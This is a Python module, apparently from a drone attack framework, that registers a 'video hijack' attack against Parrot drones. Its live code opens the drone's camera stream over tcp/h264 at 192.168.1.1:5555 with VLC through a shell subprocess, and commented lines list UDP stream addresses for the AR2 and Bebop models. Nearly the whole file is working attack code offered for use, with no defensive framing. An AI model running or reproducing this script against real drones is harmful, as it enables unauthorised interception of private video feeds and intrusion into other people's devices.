from shared import Manufacturer, Model, AttackType, InterfaceMode, CommandExecutor
from modules.exploit.base_attack_script import BaseAttackScript, AttackResult, DroneTargetInfo
from modules.exploit.attack_factory import register_attack
import subprocess

@register_attack(
    manufacturer=Manufacturer.PARROT,
    models=[m.value for m in Model],
    attack_types=[AttackType.VIDEO_HIJACK],
)
class VideoHijackAttackParrot(BaseAttackScript):
    def __init__(self, target_info: DroneTargetInfo):
        super().__init__(target_info); self.exec = CommandExecutor()

    def attack(self) -> AttackResult:
        # pre = self._ensure_interface_mode(InterfaceMode.MANAGED)
        # if not pre.status: return pre

        # if self.target_info.model == Model.PARROT_AR2:
        #     url = "udp://192.168.1.1:5555"
        # elif self.target_info.model == Model.PARROT_BEBOP:
        #     url = "udp://192.168.42.1:5555"  # example
        # else:
        #     return AttackResult(False, "", "", f"Unsupported model: {self.target_info.model}")

        # r = self.exec.execute(["ffplay", url], timeout=30, sudo=self.target_info.use_sudo)
        cmd = f"vlc tcp/h264://192.168.1.1:5555"
        subprocess.run(cmd, shell=True, check=True, text=True)
        
        return AttackResult(True, "", "", f"Video hijack attempted ({self.target_info.model})")
